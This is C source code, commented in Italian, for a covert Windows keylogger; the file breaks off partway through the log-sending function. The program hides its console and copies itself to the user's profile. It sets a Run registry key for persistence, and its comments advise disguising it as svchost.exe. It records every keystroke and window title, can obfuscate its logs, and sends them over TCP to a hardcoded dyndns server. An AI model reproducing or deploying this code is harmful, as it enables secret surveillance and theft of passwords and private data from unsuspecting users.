#ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>
#include <windows.h>
#include <tlhelp32.h>

//Path relativo %HOMEDRIVE%\%HOMEPATH%%
#define DIR_NAME          "\\Desktop\\Elenchi"
//Path relativi a %HOMEDRIVE%\%HOMEPATH%%\DIR_NAME
#define LOG_FILE_HTML     "\\log.html"
#define LOG_FILE_TXT      "\\log.txt"
//Nome eseguibile relativo a %HOMEDRIVE%\%HOMEPATH%%\DIR_NAME
#define EXE_NAME          "\\keylogger.exe"
//Nome chiave registro
#define KEY_VALUE         "keylogger"

#define HTML_LOG          1
#define TXT_LOG           0
#define ENCODE_LOG        0
#define EXT_LOG           0
#define SET_HIDDEN        0
#define MALWARE           1
#define GENERAL_INFO      0
#define DRIVES_INFO       0
#define DISK_INFO         0
#define PROCS_INFO        0
#define DEFAULT_PORT      "12345"
#define SEND_LOG          0
#define SEC_SEND_DELAY    10
#define SERVER            "nicoladomingo.dyndns.info"

char * s1 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\n \'=)(/&%$�\"![]���簧,.-_:;<>*+";
char * s2 = "aef�]ghij=)/&%$�[5tr!su:;<>IJK.LE�ధ,_mnxyVWopqbc�klABCDv wXY-Z0\'4d12\n3*+M\"NOPUQ6zFG(HRST789";
char log_file_html[200];
char log_file_txt[200];
char base_path[200];//HOMEDRIVE+HOMEPATH+DIR_NAME
char file_exe[200];
char temp[4096];
char temp2[4096];
char temp3[4096];
char date[11];
char time[6];
long last_tick;
SOCKET sock;

int  is_time_to_send(void);
int  send_all(const char *, long);
int  pressing(int);
int  toggled(int);
int  pressed(int);
void core(void);
void lgc(char c);
void lgs(const char *);
void lgs_TXT(const char *);
void lgs_HTML(const char *);
void html_encode(const char *, char *);
void get_date(void);
void get_time(void);
void new_boot(const char *);
void general_info(const char *);
void running_processes_info(void);
void disk_space_info(void);
void get_drives_info(void);
void get_error(int, char *);
void get_OS_info(void);
void setup_connection(void);
void send_log(void);
void inline cut_string_to_char(char *, char, int);
char * get_drive_type(const char * drive);
char encode(char c);

int main(int argc, char ** argv)
{
     if(MALWARE)   FreeConsole();
     new_boot(argv[0]);
     if(SEND_LOG)
       setup_connection();
     core();
     return EXIT_SUCCESS;
}

void new_boot(const char * self)
{
     HKEY key;
     char temp[200], error[200];
     int first_time = 0;
     
     GetEnvironmentVariable("HOMEDRIVE", log_file_html, 200);
     GetEnvironmentVariable("HOMEDRIVE", log_file_txt, 200);
     GetEnvironmentVariable("HOMEPATH", temp, 200);
     
     strcat(log_file_html, temp);
     strcat(log_file_html, DIR_NAME);
     strcat(log_file_txt, temp);
     strcat(log_file_txt, DIR_NAME);
     //Memorizzo il percose base, HOMEDRIVE+HOMEPATH+DIR_NAME
     strcpy(base_path, log_file_html);
     
     //Creiamo la directory
     CreateDirectory(base_path, NULL);
     if(SET_HIDDEN)
          if(SetFileAttributes(base_path, FILE_ATTRIBUTE_HIDDEN) == 0)
               exit(EXIT_FAILURE);
     
     //Creo il nome completo dei file
     strcat(log_file_html, LOG_FILE_HTML);
     strcat(log_file_txt, LOG_FILE_TXT);
     
     //Se vero, allora e' la prima volta, alla fine il programma si chiude
     if(fopen(log_file_html, "r") == NULL && fopen(log_file_txt, "r") == NULL)
          first_time = 1;
                  
     if(HTML_LOG)
     {
          if(fopen(log_file_html, "a") == NULL)
               exit(EXIT_FAILURE);
          if(SET_HIDDEN)
               if(SetFileAttributes(log_file_html, FILE_ATTRIBUTE_HIDDEN) == 0)
                    exit(EXIT_FAILURE);
     }
     if(TXT_LOG)
     {
          if(fopen(log_file_txt, "a") == NULL)
               exit(EXIT_FAILURE);
          if(SET_HIDDEN)
               if(SetFileAttributes(log_file_txt, FILE_ATTRIBUTE_HIDDEN) == 0)
                    exit(EXIT_FAILURE);
     }
     
     strcpy(temp, base_path);
     strcat(temp, EXE_NAME);
     strcpy(file_exe, temp);
     
     if(MALWARE && first_time)
     {
          //Copiamo l'eseguibile nel PC, se esiste lo sovrascrive
          CopyFile(self, file_exe, FALSE);
          if(SET_HIDDEN)
               if(SetFileAttributes(file_exe, FILE_ATTRIBUTE_HIDDEN) == 0)
                    exit(EXIT_FAILURE);
     
          //Impostiamo l'esecuzione automatica dal registro
          if(RegCreateKeyEx(
                            HKEY_CURRENT_USER, 
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                            0,
                            REG_NONE,
                            REG_OPTION_NON_VOLATILE,
                            KEY_ALL_ACCESS,
                            NULL,
                            &key,
                            NULL
                           ) != ERROR_SUCCESS)
          {
               FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, 0, 0, error, 200, NULL);
               cut_string_to_char(error, '.', 200);
               get_date();
               get_time();
               sprintf(temp, "\n\n >> >> Error creating registry key: %s - %s %s << <<\n\n", error, date, time);
               lgs(temp);
               exit(EXIT_FAILURE);
          }
          if(RegSetValueEx(key, KEY_VALUE, 0, REG_SZ, file_exe, strlen(file_exe)) != ERROR_SUCCESS){
               FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, 0, 0, error, 200, NULL);
               cut_string_to_char(error, '.', 200);
               get_date();
               get_time();
               sprintf(temp, "\n\n >> >> Error setting registry key: %s - %s %s << <<\n\n", error, date, time);
               lgs(temp);
               exit(EXIT_FAILURE);
          }
          if(RegCloseKey(key) != ERROR_SUCCESS){
               FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, 0, 0, error, 200, NULL);
               cut_string_to_char(error, '.', 200);
               get_date();
               get_time();
               sprintf(temp, "\n\n >> >> Error closing registry key: %s - %s %s << <<\n\n", error, date, time);
               lgs(temp);
               exit(EXIT_FAILURE);
          }
          /* Il programma esce, cosi' l'utente puo' cancellare l'eseguibile,
             reso eventualmente nascosto, che e' gia' stato copiato nel sistema
             e verra' eseguito al prossimo avvio senza che l'utente se ne accorga,
             a parte un breve "flash" della finestra e la presenza dell'eseguibile
             nel Task Manager (tale problema e' bypassabile impostando un nome tale
             da poter sembrare "di sistema", es. svchost.exe)*/
          exit(EXIT_SUCCESS);
     }  
     
     get_date();
     get_time();
     sprintf(temp, " >> >> >> KeyLogger Booted - %s %s << << <<\n\n", date, time);
     lgs(temp); 
      
     if(GENERAL_INFO)
         general_info(self);
     if(DRIVES_INFO)
         get_drives_info();
     if(DISK_INFO)
         disk_space_info();
     if(PROCS_INFO)
         running_processes_info();
}

void core(void)
{
     int i;
     char current_process[1024], last_process[1024];
     HWND process;
	 
	 last_tick = GetTickCount();
     while(1)
     {
          process = GetForegroundWindow();
          GetWindowText(process, current_process, 1024);
          if(strcmp(current_process, last_process) != 0 && strlen(current_process) > 0)
          {
               strcpy(last_process, current_process);
               get_time();
               sprintf(temp, "\n >> %s - %s <<\n\n", current_process, time);
               lgs(temp);
          }
          if(toggled(VK_CAPITAL))
          {
               for(i = 'A'; i <= 'Z'; i++)
                  if(pressed(i))
                      lgc(i);
          }
          //Se e' premuto CTRL+ALT+SHIFT (= AltGr + Shift), logga {}
          if(pressing(VK_SHIFT) && pressing(VK_CONTROL) && pressing(VK_MENU))
          {
               if     (pressed(186)) lgc('{');
               else if(pressed(187)) lgc('}');
          }
          if(pressing(VK_SHIFT))
          {
               for(i = 'A'; i <= 'Z'; i++)
                    if(pressed(i))
                         lgc(i);
                         
               // caratteri =!"�$%&/()
               for(i = '0'; i <= '9'; i++)
               {
                    if(pressed(i))
                    {
                         if(i == 48) lgc(61);
                         if(i == 51) lgc(163);
                         if(i == 55) lgc(47);
                         else        lgc(i-16);
                    }
               }
               if     (pressed(186)) lgc('�');
               else if(pressed(187)) lgc('*');
               else if(pressed(188)) lgc(';');
               else if(pressed(189)) lgc('_');
               else if(pressed(190)) lgc(':');
               else if(pressed(191)) lgc('�');
               else if(pressed(192)) lgc('�');
               else if(pressed(219)) lgc('?');
               else if(pressed(220)) lgc('|');
               else if(pressed(221)) lgc('^');
               else if(pressed(222)) lgc('�');
               else if(pressed(226)) lgc('>');
               if(EXT_LOG)
               {
                    if     (pressed(VK_HOME))   lgs("<SHIFT+HOME>");
                    else if(pressed(VK_END))    lgs("<SHIFT+END>");
               }
          }
          // se � premuto CTRL+ALT, logga �@#[] (e CTRL+ALT+DEL)
          else if(pressing(VK_CONTROL) && pressing(VK_MENU)) 
          {
                    if     (pressed('E'))       lgc('�');
                    else if(pressed(186))       lgc('[');
                    else if(pressed(187))       lgc(']');
                    else if(pressed(191))       lgc('�');
                    else if(pressed(192))       lgc('@');
                    else if(pressed(222))       lgc('#');
                    else if(pressed(VK_DELETE) && EXT_LOG) lgs("<CTRL+ALT+DEL>");
          }
          else if(pressing(VK_CONTROL) && EXT_LOG) 
          {
               // logga CTRL+LETTERA
               for(i = 'A'; i <= 'Z'; i++)
               {
                    if(pressed(i))
                    {
                         sprintf(temp, "<CTRL+%c>", i);
                         lgs(temp);
                    }
               }
               
               for(i = '0'; i <= '9'; i++) 
               {
                    if(pressed(i))
                    {
                         sprintf(temp, "<CTRL+%c>", i);
                         lgs(temp);
                    }
               }
               // logga CTRL+numeri_num_pad
               for(i = VK_NUMPAD0; i <= VK_NUMPAD9; i++)
               {
                    if(pressed(i))
                    {
                         sprintf(temp, "<CTRL+%d>", i-96);
                         lgs(temp);
                    }
               }
          }
          else if(pressing(VK_MENU) && EXT_LOG) 
          {
               // logga ALT+LETTERA
               for(i = 'A'; i <= 'Z'; i++)
               {
                    if(pressed(i))
                    {
                         sprintf(temp, "<ALT+%c>", i);
                         lgs(temp);
                    }
               }
               // logga ALT+NUMERI
               for(i = '0'; i <= '9'; i++)
               {
                    if(pressed(i))
                    {
                         sprintf(temp, "<ALT+%c>", i);
                         lgs(temp);
                    }
               }
               // logga ALT+NUMPAD
               for(i = VK_NUMPAD0; i <= VK_NUMPAD9; i++)
               {
                    if(pressed(i))
                    {
                         sprintf(temp, "<ALT+%d>", i-96);
                         lgs(temp);
                    }
               }
          }
          // se SHIFT non � premuto, logga lettere minuscole e i numeri 0123456789
          else 
          {
               for (i = 'A'; i <= 'Z'; i++)
                    if(pressed(i))
                         lgc(i+32);

               for(i = '0'; i <= '9'; i++) // numeri
                    if(pressed(i))
                         lgc(i);
               
               if     (pressed(186)) lgc('�');
               else if(pressed(187)) lgc('+');
               else if(pressed(188)) lgc(',');
               else if(pressed(189)) lgc('-');
               else if(pressed(190)) lgc('.');
               else if(pressed(191)) lgc('�');
               else if(pressed(192)) lgc('�');
               else if(pressed(219)) lgc('\'');
               else if(pressed(220)) lgc('\\');
               else if(pressed(221)) lgc('�');
               else if(pressed(222)) lgc('�');               
               else if(pressed(226)) lgc('<');
          }
          // NUMPAD
          for(i = VK_NUMPAD0; i <= VK_NUMPAD9; i++) 
               if(pressed(i))
                    lgc(i-'0');
          // F1 - F12
          for(i = VK_F1; i <= VK_F12; i++) 
          {
               if(pressed(i) && EXT_LOG)
               {
                    sprintf(temp, "<F%d>", i-111);
                    lgs(temp);
               }
          }
  
          if     (pressed(VK_MULTIPLY))  lgc('*');
          else if(pressed(VK_ADD))       lgc('+');
          else if(pressed(VK_SUBTRACT))  lgc('-');
          else if(pressed(VK_DECIMAL))   lgc('.');
          else if(pressed(VK_DIVIDE))    lgc('/');
          else if(pressed(VK_SPACE))     lgc(' ');
          else if(pressed(VK_RETURN))    lgc('\n');
          if(EXT_LOG)
          {
               if     (pressed(VK_DELETE))    lgs("<DEL>");
               else if(pressed(VK_PRIOR))     lgs("<PAGE_UP>");
               else if(pressed(VK_NEXT))      lgs("<PAGE_DOWN>");
               else if(pressed(VK_BACK))      lgs("<BACK>");
               else if(pressed(VK_DELETE))    lgs("<DEL>");
               else if(pressed(VK_ESCAPE))    lgs("<ESC>");
               else if(pressed(VK_HOME))      lgs("<HOME>");
               else if(pressed(VK_END))       lgs("<END>");
               else if(pressed(VK_TAB))       lgs("<TAB>");
               else if(pressed(VK_LEFT))      lgs("<L>");
               else if(pressed(VK_RIGHT))     lgs("<R>");
               else if(pressed(VK_UP))        lgs("<U>");
               else if(pressed(VK_DOWN))      lgs("<D>");
               else if(pressed(VK_NUMLOCK))
               {
                    if(toggled(VK_NUMLOCK))   lgs("<NUM_LOCK ON>");
                    else                      lgs("<NUM_LOCK OFF>");
               }
               else if(pressed(VK_SCROLL))
               {
                    if(toggled(VK_SCROLL))    lgs("<SCROLL_LOCK ON>");
                    else                      lgs("<SCROLL_LOCK OFF>");
               }
               else if(pressed(VK_INSERT))
               {
                    if(toggled(VK_INSERT))    lgs("<INS ON>");
                    else                      lgs("<INS OFF>");
               }
          }
          if(SEND_LOG && is_time_to_send())
               send_log();
          sleep(1);
     }
}

int pressing(int v_key)
{
     /* SHORT GetKeyState(int nVirtKey);
        * If the high-order bit is 1, the key is down; otherwise, it is up.
          ERRATO: dalle prove risulta l'esatto contrario
        * If the low-order bit is 1, the key is toggled. A key, such as the
          CAPS LOCK key, is toggled if it is turned on.
          The key is off and untoggled if the low-order bit is 0.
          A toggle key's indicator light (if any) on the keyboard will be on
          when the key is toggled, and off when the key is untoggled. */

     if((GetKeyState(v_key) & 0x00000080) != 0) return 1;
     return 0;
}

int toggled(int v_key)
{
     if((GetKeyState(v_key) & 0x00000001) != 0) return 1;
     return 0;
}

int pressed(int v_key)
{
     /* SHORT GetAsyncKeyState(int vKey);
        Return Value
        If the function succeeds, the return value specifies whether the key
        was pressed since the last call to GetAsyncKeyState, and whether the
        key is currently up or down. If the most significant bit is set,
        the key is down, and if the least significant bit is set, the key was
        pressed after the previous call to GetAsyncKeyState. */

     if((GetAsyncKeyState(v_key) & 0x00000001) != 0) return 1;
     return 0;
}

void lgc(char c)
{
     temp[0] = c;
     temp[1] = 0;
     lgs(temp);
}

void lgs(const char * text)
{
     if(HTML_LOG) lgs_HTML(text);
     if(TXT_LOG)  lgs_TXT(text);
}

void lgs_TXT(const char * text)
{
     FILE * logfile;
	 if(ENCODE_LOG)
     {
          int j;
          for(j = 0; j < strlen(text); j++)
               temp[j] = encode(text[j]);
          temp[j] = 0;
     }
     else strcpy(temp, text);

     logfile = fopen(log_file_txt, "a");
     if(logfile == NULL)
          exit(EXIT_FAILURE);
     else{
          fprintf(logfile, "%s", temp);
          fclose(logfile);
     }
}

void lgs_HTML(const char * text)
{
     FILE * logfile;
	 /*if(strstr(text, ">> >> >>") != NULL)
     {
          strcpy(temp2, "<font size = 4 color = #000000><bold>");
          html_encode(text, temp3);
          strcat(temp2, temp3);
          strcat(temp2, "</bold><font size = 3 color = #ffffff>");
     }*/
     if(strstr(text, ">> >>") != NULL)
     {
          strcpy(temp2, "<font size = 4 color = #ff0000><bold>");
          html_encode(text, temp3);
          strcat(temp2, temp3);
          strcat(temp2, "</bold><font size = 3 color = #ffffff>");
     }
     else if(strstr(text, ">>") != NULL)
     {
          strcpy(temp2, "<font size = 3 color = #00ff00>");
          html_encode(text, temp3);
          strcat(temp2, temp3);
          strcat(temp2, "<font size = 3 color = #ffffff>");
     }
     else if(strstr(text, "<") != NULL)
     {
          strcpy(temp2, "<font size = 3 color = #ffff00>");
          html_encode(text, temp3);
          strcat(temp2, temp3);
          strcat(temp2, "<font size = 3 color = #ffffff>");
     }
     else
          html_encode(text, temp2);

     if(ENCODE_LOG)
     {
          int j;
          for(j = 0; j < strlen(temp2); j++)
               temp3[j] = encode(temp2[j]);
          temp3[j] = 0;
     }
     else strcpy(temp3, temp2);

     logfile = fopen(log_file_html, "a");
     if(logfile == NULL)
          exit(EXIT_FAILURE);
     else
     {
          fseek(logfile, 0, SEEK_END);
          int filesize = ftell(logfile);
          rewind(logfile);
          
          // se il file � vuoto allora procede a inizializzare il codice HTML
          if(filesize == 0) 
          {
               char * head_code = "<html>\n"
                                  "<head>\n"
                                  "<title>Log File</title>\n"
                                  "</head>\n\n"
                                  "<body alink=\"#ffffff\" bgcolor=\"#444444\" text=\"#ffffff\" vlink=\"#ffffff\" link=\"#ffffff\">\n"
                                  "<font size = 3 color = #ffffff><code>\n";

               if(ENCODE_LOG)
               {
                    int j;
                    for(j = 0; j < strlen(head_code); j++)
                         temp2[j] = encode(head_code[j]);
                    temp2[j] = 0;
               }
               else strcpy(temp2, head_code);
               fputs(temp2, logfile);
          }
          fprintf(logfile, "%s", temp3);
          fclose(logfile);
     }
}

void html_encode(const char * source, char *dest)
{
     dest[0] = 0;
     int i;
     for(i = 0; i < strlen(source); i++)
     {
          if     (source[i] == '"')  strcat(dest, "&quot;");
          else if(source[i] == '<')  strcat(dest, "&lt;");
          else if(source[i] == '>')  strcat(dest, "&gt;");
          else if(source[i] == '&')  strcat(dest, "&amp;");
          else if(source[i] == '\n') strcat(dest, "<br>\n");
          else
          {
               int last_char_pos = strlen(dest);
               dest[last_char_pos] = source[i];
               dest[last_char_pos+1] = 0;
          }
     }
}

void get_date(void)
{
     SYSTEMTIME st;
     GetLocalTime(&st);
     sprintf(date, "%02d/%02d/%04d", st.wDay, st.wMonth, st.wYear);
}

void get_time(void)
{
     SYSTEMTIME st;
     GetLocalTime(&st);
     sprintf(time, "%02d:%02d", st.wHour, st.wMinute);
}

void general_info(const char * argv0)
{
     int cpu_arch;
     char temp2[1024];
     DWORD bufCharCount = 1024;
     SYSTEM_INFO si;

     ZeroMemory(&si, sizeof(SYSTEM_INFO));

     lgs(">> GENERAL INFOs <<\n\n");
     
     GetComputerName(temp2, &bufCharCount);
     sprintf(temp, "Computer name: %s\n", temp2);
     lgs(temp);
     GetUserName(temp2, &bufCharCount);
     sprintf(temp, "User name:     %s\n", temp2);
     lgs(temp);

     GetSystemInfo(&si);
     cpu_arch = si.wProcessorArchitecture;

     lgs("CPU architecture: ");
     if     (cpu_arch == PROCESSOR_ARCHITECTURE_AMD64)  lgs("x64(AMD or Intel)\n");
     else if(cpu_arch == PROCESSOR_ARCHITECTURE_IA64)   lgs("Intel Itanium Processor Family (IPF)\n");
     else if(cpu_arch == PROCESSOR_ARCHITECTURE_INTEL)  lgs("x86\n");
     else                                               lgs("Unknown architecture\n");

     sprintf(temp, "CPUs: %d\n", si.dwNumberOfProcessors);
     lgs(temp);
     sprintf(temp, "CPU Level: %d\n", si.wProcessorLevel);
     lgs(temp);
     sprintf(temp, "CPU Revision: %d\n", si.wProcessorRevision);
     lgs(temp);
     sprintf(temp, "Lowest memory address accessible to apps and DLLs: 0x%08x\n", si.lpMinimumApplicationAddress);
     lgs(temp);
     sprintf(temp, "Highest memory address accessible to apps and DLLs: 0x%08x\n", si.lpMaximumApplicationAddress);
     lgs(temp);
     
     get_OS_info();

     GetWindowsDirectory(temp2, 1024);
     sprintf(temp, "Windows dir:   %s\n", temp2);
     lgs(temp);
     GetSystemDirectory(temp2, 1024);
     sprintf(temp, "System32 dir:  %s\n", temp2);
     lgs(temp);
     GetCurrentDirectory(1024, temp2);
     sprintf(temp, "Current dir:   %s\n", temp2);
     lgs(temp);
     sprintf(temp, "Program path:   %s\n", argv0);
     lgs(temp);
     sprintf(temp, "Screen resolution: %dx%d\n\n", GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
     lgs(temp);
}

void get_OS_info(void)
{
     char temp[50];
     OSVERSIONINFOEX osvi;
     SYSTEM_INFO si;
     //PGPI pGPI;
     //DWORD dwType;

     ZeroMemory(&si, sizeof(SYSTEM_INFO));
     ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
     osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
     
     GetVersionEx((OSVERSIONINFO *)&osvi);
     GetSystemInfo(&si);
     
     lgs("OS: ");
     if(osvi.dwMajorVersion == 6)
     {
          if(osvi.dwMinorVersion == 1)
          {
              if(osvi.wProductType == VER_NT_WORKSTATION)
                   lgs("Windows 7");
              else
                   lgs("Windows Server 2008 R2");                
          }
          else if(osvi.dwMinorVersion == 0)
          {
               if(osvi.wProductType == VER_NT_WORKSTATION)
                   lgs("Windows Vista");
               else
                   lgs("Windows Server 2008");   
          }
          
          /*pGPI = (PGPI) GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetProductInfo");
          pGPI(osvi.dwMajorVersion, osvi.dwMinorVersion, 0, 0, &dwType);
          
          switch(dwType)
          {
               case PRODUCT_ULTIMATE:
                    lgs("Ultimate Edition");
                    break;
               case PRODUCT_PROFESSIONAL:
                    lgs("Professional");
                    break;
               case PRODUCT_HOME_PREMIUM:
                    lgs("Home Premium Edition" );
                    break;
               case PRODUCT_HOME_BASIC:
                    lgs("Home Basic Edition");
                    break;
               case PRODUCT_ENTERPRISE:
                    lgs("Enterprise Edition");
                    break;
               case PRODUCT_BUSINESS:
                    lgs("Business Edition");
                    break;
               case PRODUCT_STARTER:
                    lgs("Starter Edition");
                    break;
          }*/

          if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
            lgs(", 64-bit");
          else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
            lgs(", 32-bit");

     }
     else if(osvi.dwMajorVersion == 5)
     {
          if(osvi.dwMinorVersion == 2)
          {
                if(osvi.wProductType == VER_NT_WORKSTATION && si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
                   lgs("Windows XP Professional x64 Edition");
                else
                   lgs("Unknown");
          }
          else if(osvi.dwMinorVersion == 1)
          {
               if(osvi.wSuiteMask & VER_SUITE_PERSONAL)
                   lgs("Windows XP Home Edition");
               else
                   lgs("Windows XP Professional");
          }
          else if(osvi.dwMinorVersion == 0)
          {
               lgs("Windows 2000");
               if (osvi.wProductType == VER_NT_WORKSTATION)
                   lgs(" Professional");
               else 
               {
                   if(osvi.wSuiteMask & VER_SUITE_DATACENTER)
                        lgs(" Datacenter Server");
                   else if(osvi.wSuiteMask & VER_SUITE_ENTERPRISE)
                        lgs(" Advanced Server");
                   else
                        lgs(" Server");
               }
          }
     }
     else
          lgs("< Windows 2000");
     
     if(strlen(osvi.szCSDVersion) == 0)
          lgs("\n");
     else
     {
          sprintf(temp, " %s\n", osvi.szCSDVersion);
          lgs(temp);
     }
}

void running_processes_info(void)
{
     HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 pe32;
     pe32.dwSize = sizeof(PROCESSENTRY32);
     
     lgs(">> RUNNING PROCESSES <<\n\n");
     while(Process32Next(hProcessSnap, &pe32)){
          sprintf(temp,"%5d  -  %s\n", pe32.th32ProcessID, pe32.szExeFile);
          lgs(temp);
     }
     CloseHandle(hProcessSnap);
}

void disk_space_info(void)
{
     __int64 total_int64, free_int64;
     double total, used, free;
     int type, i = 0, count = 0;
     char drives[50], temp[100];
     
     GetLogicalDriveStrings(50, drives);
     for(i = 0; i < 50; i++){
          if(drives[i] == 0)
             count++;
          if(drives[i] == 0 && drives[i+1] == 0) break;
     }
     
     lgs(">> DISK SPACE ANALIZER <<\n\n");
     for(i = 0; i < count; i++)
     {
           type = GetDriveType(drives+4*i);
           if(type == DRIVE_UNKNOWN || type == DRIVE_NO_ROOT_DIR || type == DRIVE_CDROM)
                continue;
           sprintf(temp, ">> Drive %s -> %s <<\n", drives+4*i, get_drive_type(drives+4*i));
           lgs(temp);
           
           GetDiskFreeSpaceEx(drives+4*i, 0, (PULARGE_INTEGER)&total_int64, (PULARGE_INTEGER)&free_int64);
           total = (double)total_int64/(1024*1024*1024);
           free = (double)free_int64/(1024*1024*1024);
           used = total-free;

           sprintf(temp, " - Total disk space: %.*f GB\n", 2, total);
           lgs(temp);
           sprintf(temp, " - Used disk space:  %.*f GB\n", 2, used);
           lgs(temp);
           sprintf(temp, " - Free disk space:  %.*f GB\n", 2, free);
           lgs(temp);
           sprintf(temp, " - Used disk space:  %.*f%%\n\n", 2, used/total*100);
           lgs(temp);
     }
}

void get_drives_info(void)
{
     int i = 0, count = 0;
     char drives[50], temp[100];
     GetLogicalDriveStrings(50, drives);
   
     for(i = 0; i < 50; i++){
          if(drives[i] == 0)
             count++;
          if(drives[i] == 0 && drives[i+1] == 0) break;
     }
   
     lgs(">> LOGICAL DRIVES ANALIZER <<\n\n");
     for(i = 0; i < count; i++){
         sprintf(temp, "%s -> %s\n", drives+4*i, get_drive_type(drives+4*i));
         lgs(temp);
     }
     lgs("\n");
}

char * get_drive_type(const char * drive)
{
     int drive_type = GetDriveType(drive);
     if     (drive_type == DRIVE_UNKNOWN)      return "Unknown drive type";
     else if(drive_type == DRIVE_NO_ROOT_DIR)  return "Root path invalid";
     else if(drive_type == DRIVE_REMOVABLE)    return "Removable drive";
     else if(drive_type == DRIVE_FIXED)        return "Hard drive";
     else if(drive_type == DRIVE_REMOTE)       return "Remote drive";
     else if(drive_type == DRIVE_CDROM)        return "CD-ROM drive";
     else if(drive_type == DRIVE_RAMDISK)      return "RAM drive";
}

char encode(char c)
{
     int i;
     for(i = 0; i < strlen(s1); i++)
          if(c == s1[i])
               return s2[i];
     return c;
}

void inline cut_string_to_char (char * str, char c, int size)
{
     int i;
     for(i = 0; i < size; i++)
     {
           if(str[i] == c)
           {
                 str[i] = 0;
                 break;
           }
     }
}

void get_error(int error, char * str)
{
     switch(error)
     {
          case WSASYSNOTREADY:
               strcpy(str, "The underlying network subsystem is not ready for network communication");
               break;
          case WSAVERNOTSUPPORTED:
               strcpy(str, "The version of Windows Sockets support requested is not provided by this particular Windows Sockets implementation");
               break;
          case WSAEINPROGRESS:
               strcpy(str, "A blocking Windows Sockets 1.1 operation is in progress");
               break;
          case WSAEPROCLIM:
               strcpy(str, "A limit on the number of tasks supported by the Windows Sockets implementation has been reached");
               break;
          case WSAEFAULT:
               strcpy(str, "The lpWSAData parameter is not a valid pointer");
               break;
          default:
               strcpy(str, "Unknown error");
               break;
     }
}

int is_time_to_send(void) 
{
	long now;
	int err;
	char error[200];
	struct hostent * host = NULL;
	WSADATA wsaData;
	
    now = GetTickCount();
	if(now-last_tick > 1000*SEC_SEND_DELAY)
	{
		last_tick = now;
        if((err = WSAStartup(MAKEWORD(2, 2), &wsaData)) == 0)
		{
			//Test della connessione
			host = gethostbyname("www.google.com");
			if(host != NULL){
                WSACleanup();
                return 1;
            }			
			get_date();
            get_time();
            sprintf(temp, "\n\n >> >> Connection not available - %s %s << <<\n\n", date, time);
            lgs(temp);
			WSACleanup();
			if(host == NULL)
                return 0;
		}
        else
        {
            get_error(err, error);
            get_date();
            get_time();
            sprintf(temp, "\n\n >> >> Error at WSAStartup(): %s - %s %s << <<\n\n", error, date, time);
            lgs(temp);
            WSACleanup();
            return 0;
        }	
	}
	return 0;
}

void setup_connection(void)
{
    struct sockaddr_in serv_addr;
	struct hostent * server = NULL;
    WSADATA wsaData;
    int err;
    
    if ((err = WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0){
        get_date();
        get_time();
        sprintf(temp, "\n\n >> >> Error at WSAStartup(): %d - %s %s << <<\n\n", err, date, time);
        lgs(temp);
        exit(EXIT_FAILURE);
    }

    if((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET){
        get_date();
        get_time();
        sprintf(temp, "\n\n >> >> Error at socket(): %s - %s %s << <<\n\n", WSAGetLastError(), date, time);
        lgs(temp);
        WSACleanup();
        exit(EXIT_FAILURE);
    }

    ZeroMemory(&serv_addr, sizeof(serv_addr));
    if((server = gethostbyname(SERVER)) == NULL){
        get_date();
        get_time();
        sprintf(temp, "\n\n >> >> Error at gethostbyname(): %s - %s %s << <<\n\n", WSAGetLastError(), date, time);
        lgs(temp);
        closesocket(sock);
        WSACleanup();
        exit(EXIT_FAILURE);
    }

    CopyMemory((char *)&serv_addr.sin_addr.s_addr, (char *)server->h_addr, server->h_length);
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(atoi(DEFAULT_PORT));
	
	if (connect(sock,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) == SOCKET_ERROR){
        get_date();
        get_time();
        sprintf(temp, "\n\n >> >> Error at connect(): %d - %s %s << <<\n\n", WSAGetLastError(), date, time);
        lgs(temp);
        closesocket(sock);
        WSACleanup();
        exit(EXIT_FAILURE);
    }
    else
        lgs("\n\n >> >> Setup Connection OK << << \n\n");
}

int send_all (const char * buf, long dim)
{
    int n, sent = 0, left_to_send = dim;
    char str[20];
    
    //Dico se mando un file html o txt e la dimensione del file
    if(HTML_LOG)
        sprintf(str, "1%ld", dim);
    else if(TXT_LOG)
        sprintf(str, "0%ld", dim);
    if (send(sock, str, 20, 0) == SOCKET_ERROR)
        return -1;
        
    //Aspetto l'ack
    recv(sock, str, 20, 0);
    
    //Mando il file
    while(sent < dim)
    {
        if ((n = send(sock, buf+sent, left_to_send, 0)) == SOCKET_ERROR)
            return -1;
        sent += n;
        left_to_send -= n;
        //Aspetto l'ack
        recv(sock, str, 20, 0);
    }
    return 1;
}

void send_log(void)
{
    FILE * html_log, * txt_log;
    int i;
    long size;
    char * buffer;
    
    if(gethostbyname(SERVER) == NULL){
        get_date();
        get_time();
        sprintf(temp, "\n\n >> >> Error at gethostbyname(): %s - %s %s << <<\n\n", WSAGetLastError(), date, time);
        lgs(temp);
        return;
    }
    
    if(HTML_LOG)
    {
        if((html_log = fopen(log_file_html, "r+b")) == NULL)
            return;
        fseek(html_log, 0, SEEK_END);
        size = ftell(html_log);
        rewind(html_log);
        buffer = malloc(size);
        if(fread(buffer, 1, size, html_log) != size){
            get_date();
            get_time();
            sprintf(temp, "\n\n >> >> Error at reading %s - %s %s << <<\n\n", log_file_html, date, time);
            lgs(temp);
            free(buffer);
            fclose(html_log);
            return;
        }
        if(send_all(buffer, size) < 0){
            get_date();
            get_time();
            sprintf(temp, "\n\n >> >> Error at sending %s - %s %s << <<\n\n", log_file_html, date, time);
            lgs(temp);
